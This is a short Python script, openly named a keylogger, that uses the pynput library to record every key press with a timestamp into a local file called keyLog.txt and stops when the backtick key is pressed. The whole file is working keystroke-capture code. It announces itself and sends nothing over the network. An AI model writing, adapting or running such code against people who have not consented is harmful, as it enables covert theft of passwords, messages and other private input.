import pynput
print('Running keylogger')
from pynput.keyboard import Key,Listener
import logging

log_dir = r"./"
logging.basicConfig(filename=(log_dir+"keyLog.txt"),level=logging.INFO,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if(str(key) == '\'`\''):
        print("exit")
        exit()

with Listener(on_press=on_press) as listener:
    listener.join()